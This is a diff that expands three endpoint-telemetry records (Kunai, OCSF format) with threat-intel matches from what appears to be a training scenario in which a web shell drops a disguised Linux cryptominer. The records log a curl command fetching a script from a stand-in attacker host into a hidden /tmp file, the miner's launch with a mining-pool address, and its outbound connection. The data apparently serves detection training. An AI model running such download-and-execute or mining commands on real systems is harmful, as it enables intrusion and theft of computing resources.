@@ -1,45 +1,457 @@
 {
+  metadata: {
+    version: "1.9.0",
+    product: {
+      name: "Kunai",
+      vendor_name: "Kunai Project",
+    },
+    profiles: [
+      "host",
+    ],
+    event_code: "connect",
+    uid: "38bed1b3-ac56-580b-ab06-895dc336787f",
+  },
+  severity_id: 1,
   time: 2026-09-14T08:12:01.450Z,
-  class_name: "Network Activity",
-  process: "curl",
+  device: {
+    hostname: "web-01",
+    uid: "6b1f1c0e-7c1d-4a52-9f5a-2d0c4c0f9a11",
+  },
+  category_uid: 4,
+  class_uid: 4001,
+  initiator_id: 1,
+  activity_id: 1,
+  status_id: 1,
+  actor: {
+    process: {
+      name: "curl",
+      pid: 4411,
+      ptid: 4411,
+      uid: "0c4f551c-2ea2-54e1-9e13-7ac76171c2de",
+      user: {
+        uid: "33",
+        name: "www-data",
+        type_id: null,
+        groups: [
+          {
+            uid: "33",
+            name: "www-data",
+          },
+        ],
+      },
+      parent_process: {
+        name: "sh",
+        pid: 4410,
+        ptid: 4410,
+        uid: "0f1e1f77-f536-5084-9ada-445c303e8a91",
+        user: {
+          uid: "33",
+          name: "www-data",
+          type_id: null,
+          groups: [
+            {
+              uid: "33",
+              name: "www-data",
+            },
+          ],
+        },
+      },
+      cmd_line: "curl -fsSL http://dl.evil-cdn.example/x.sh -o /tmp/.x.sh",
+      file: {
+        name: "curl",
+        path: "/usr/bin/curl",
+        type_id: 8,
+        desc: null,
+        size: null,
+      },
+      ancestry: [
+        {
+          path: "/usr/bin/dash",
+          name: "dash",
+        },
+        {
+          path: "/usr/sbin/apache2",
+          name: "apache2",
+        },
+        {
+          path: "/usr/lib/systemd/systemd",
+          name: "systemd",
+        },
+      ],
+    },
+    user: {
+      uid: "33",
+      name: "www-data",
+      type_id: null,
+      groups: [
+        {
+          uid: "33",
+          name: "www-data",
+        },
+      ],
+    },
+  },
+  connection_info: {
+    community_uid: "1:x/+HV0TSji4e6MFS4ZvKqbJYrvU=",
+    protocol_name: "tcp",
+    protocol_num: 6,
+    protocol_ver_id: 4,
+    direction_id: 2,
+  },
+  src_endpoint: {
+    ip: 10.0.0.15,
+    port: 52144,
+    network_scope_id: 1,
+  },
+  dst_endpoint: {
+    ip: 203.0.113.50,
+    port: 80,
+    hostname: "dl.evil-cdn.example",
+    network_scope_id: 2,
+  },
+  type_uid: 400101,
+  unmapped: {
+    data: {
+      socket: {
+        type: "SOCK_STREAM",
+      },
+    },
+    info: {
+      event: {
+        batch: 104,
+      },
+      task: {
+        namespaces: {
+          mnt: 4026531841,
+        },
+        flags: "0x400000",
+        zombie: false,
+      },
+      parent_task: {
+        namespaces: {
+          mnt: 4026531841,
+        },
+        flags: "0x400000",
+        zombie: false,
+      },
+    },
+  },
   dst_ip: 203.0.113.50,
   dst_host: "dl.evil-cdn.example",
   sha256: null,
-  ioc: {
+  hit_ip: {
     type: "ip-dst",
     category: "Network activity",
     comment: "payload server",
     event_uuid: "6f0c2b1e-3a4d-4c57-9e1f-5d7a8b9c0d11",
     event_info: "NGSOTI training: web shell drops Linux miner (kworker-ng)",
   },
+  hit_host: {
+    type: "domain",
+    category: "Network activity",
+    comment: "payload host",
+    event_uuid: "6f0c2b1e-3a4d-4c57-9e1f-5d7a8b9c0d11",
+    event_info: "NGSOTI training: web shell drops Linux miner (kworker-ng)",
+  },
+  hit_hash: null,
+  seen_ip: true,
 }
 {
+  metadata: {
+    version: "1.9.0",
+    product: {
+      name: "Kunai",
+      vendor_name: "Kunai Project",
+    },
+    profiles: [
+      "host",
+    ],
+    event_code: "execve",
+    uid: "7baf8868-b9d3-5c82-84d2-db0bab7cb209",
+  },
+  severity_id: 1,
   time: 2026-09-14T08:12:04.100Z,
-  class_name: "Process Activity",
-  process: "kworker-ng",
+  device: {
+    hostname: "web-01",
+    uid: "6b1f1c0e-7c1d-4a52-9f5a-2d0c4c0f9a11",
+  },
+  category_uid: 1,
+  class_uid: 1007,
+  activity_id: 1,
+  launch_type_id: 3,
+  process: {
+    name: "kworker-ng",
+    pid: 4433,
+    ptid: 4433,
+    uid: "cca9befe-9e37-5ca6-8e18-5ddd41e0a880",
+    user: {
+      uid: "33",
+      name: "www-data",
+      type_id: null,
+      groups: [
+        {
+          uid: "33",
+          name: "www-data",
+        },
+      ],
+    },
+    parent_process: {
+      name: "x.sh",
+      pid: 4420,
+      ptid: 4420,
+      uid: "9ee38358-13f1-57b2-b709-ec65afc642fc",
+      user: {
+        uid: "33",
+        name: "www-data",
+        type_id: null,
+        groups: [
+          {
+            uid: "33",
+            name: "www-data",
+          },
+        ],
+      },
+      file: {
+        name: "bash",
+        path: "/usr/bin/bash",
+        type_id: 8,
+      },
+      cmd_line: "/bin/bash /tmp/.x.sh",
+    },
+    cmd_line: "/tmp/.kworker-ng --pool 198.51.100.7:4444",
+    file: {
+      name: ".kworker-ng",
+      path: "/tmp/.kworker-ng",
+      type_id: 8,
+      desc: null,
+      size: 2893104,
+      hashes: [
+        {
+          algorithm_id: 1,
+          value: "ae880f64ad8b39c7ab4f6685d52cc037",
+        },
+        {
+          algorithm_id: 2,
+          value: "defa69a5e8d164c5d07ad97d0e309a86b3d85532",
+        },
+        {
+          algorithm_id: 3,
+          value: "b6f3c8a5d1e94f7a2c0b8d6e4f1a3c5e7b9d0f2a4c6e8b0d1f3a5c7e9b1d3f5a",
+        },
+        {
+          algorithm_id: 4,
+          value: "d5f22837c425a6455359beeafcd30ff7b2f3db4b9d67ff1fd50b4fd9997ac6023d00b5309ccf4893983f774140411375d7b1fdfe3b6c857f131a38ad5a286d4d",
+        },
+      ],
+    },
+    ancestry: [
+      {
+        path: "/usr/bin/dash",
+        name: "dash",
+      },
+      {
+        path: "/usr/sbin/apache2",
+        name: "apache2",
+      },
+      {
+        path: "/usr/lib/systemd/systemd",
+        name: "systemd",
+      },
+    ],
+  },
+  actor: {
+    process: {
+      pid: 4433,
+      ptid: 4433,
+      uid: "cca9befe-9e37-5ca6-8e18-5ddd41e0a880",
+    },
+    user: null,
+  },
+  type_uid: 100701,
+  unmapped: {
+    info: {
+      event: {
+        batch: 110,
+      },
+      task: {
+        namespaces: {
+          mnt: 4026531841,
+        },
+        flags: "0x400000",
+        zombie: false,
+      },
+      parent_task: {
+        namespaces: {
+          mnt: 4026531841,
+        },
+        flags: "0x400000",
+        zombie: false,
+      },
+    },
+  },
   dst_ip: null,
   dst_host: null,
   sha256: "b6f3c8a5d1e94f7a2c0b8d6e4f1a3c5e7b9d0f2a4c6e8b0d1f3a5c7e9b1d3f5a",
-  ioc: {
+  hit_ip: null,
+  hit_host: null,
+  hit_hash: {
     type: "sha256",
     category: "Payload delivery",
     comment: "kworker-ng miner",
     event_uuid: "6f0c2b1e-3a4d-4c57-9e1f-5d7a8b9c0d11",
     event_info: "NGSOTI training: web shell drops Linux miner (kworker-ng)",
   },
+  seen_ip: null,
 }
 {
+  metadata: {
+    version: "1.9.0",
+    product: {
+      name: "Kunai",
+      vendor_name: "Kunai Project",
+    },
+    profiles: [
+      "host",
+    ],
+    event_code: "connect",
+    uid: "08394182-aa57-56eb-b064-185d3517d059",
+  },
+  severity_id: 1,
   time: 2026-09-14T08:12:04.300Z,
-  class_name: "Network Activity",
-  process: "kworker-ng",
+  device: {
+    hostname: "web-01",
+    uid: "6b1f1c0e-7c1d-4a52-9f5a-2d0c4c0f9a11",
+  },
+  category_uid: 4,
+  class_uid: 4001,
+  initiator_id: 1,
+  activity_id: 1,
+  status_id: 1,
+  actor: {
+    process: {
+      name: "kworker-ng",
+      pid: 4433,
+      ptid: 4433,
+      uid: "cca9befe-9e37-5ca6-8e18-5ddd41e0a880",
+      user: {
+        uid: "33",
+        name: "www-data",
+        type_id: null,
+        groups: [
+          {
+            uid: "33",
+            name: "www-data",
+          },
+        ],
+      },
+      parent_process: {
+        name: "x.sh",
+        pid: 4420,
+        ptid: 4420,
+        uid: "9ee38358-13f1-57b2-b709-ec65afc642fc",
+        user: {
+          uid: "33",
+          name: "www-data",
+          type_id: null,
+          groups: [
+            {
+              uid: "33",
+              name: "www-data",
+            },
+          ],
+        },
+      },
+      cmd_line: "/tmp/.kworker-ng --pool 198.51.100.7:4444",
+      file: {
+        name: ".kworker-ng",
+        path: "/tmp/.kworker-ng",
+        type_id: 8,
+        desc: null,
+        size: null,
+      },
+      ancestry: [
+        {
+          path: "/usr/bin/dash",
+          name: "dash",
+        },
+        {
+          path: "/usr/sbin/apache2",
+          name: "apache2",
+        },
+        {
+          path: "/usr/lib/systemd/systemd",
+          name: "systemd",
+        },
+      ],
+    },
+    user: {
+      uid: "33",
+      name: "www-data",
+      type_id: null,
+      groups: [
+        {
+          uid: "33",
+          name: "www-data",
+        },
+      ],
+    },
+  },
+  connection_info: {
+    community_uid: "1:cxnPTmOCSBbmMbJwFnzHHUqx8Mo=",
+    protocol_name: "tcp",
+    protocol_num: 6,
+    protocol_ver_id: 4,
+    direction_id: 2,
+  },
+  src_endpoint: {
+    ip: 10.0.0.15,
+    port: 40322,
+    network_scope_id: 1,
+  },
+  dst_endpoint: {
+    ip: 198.51.100.7,
+    port: 4444,
+    hostname: null,
+    network_scope_id: 2,
+  },
+  type_uid: 400101,
+  unmapped: {
+    data: {
+      socket: {
+        type: "SOCK_STREAM",
+      },
+    },
+    info: {
+      event: {
+        batch: 113,
+      },
+      task: {
+        namespaces: {
+          mnt: 4026531841,
+        },
+        flags: "0x400000",
+        zombie: false,
+      },
+      parent_task: {
+        namespaces: {
+          mnt: 4026531841,
+        },
+        flags: "0x400000",
+        zombie: false,
+      },
+    },
+  },
   dst_ip: 198.51.100.7,
   dst_host: null,
   sha256: null,
-  ioc: {
+  hit_ip: {
     type: "ip-dst",
     category: "Network activity",
     comment: "mining pool / C2",
     event_uuid: "6f0c2b1e-3a4d-4c57-9e1f-5d7a8b9c0d11",
     event_info: "NGSOTI training: web shell drops Linux miner (kworker-ng)",
   },
+  hit_host: null,
+  hit_hash: null,
+  seen_ip: true,
 }
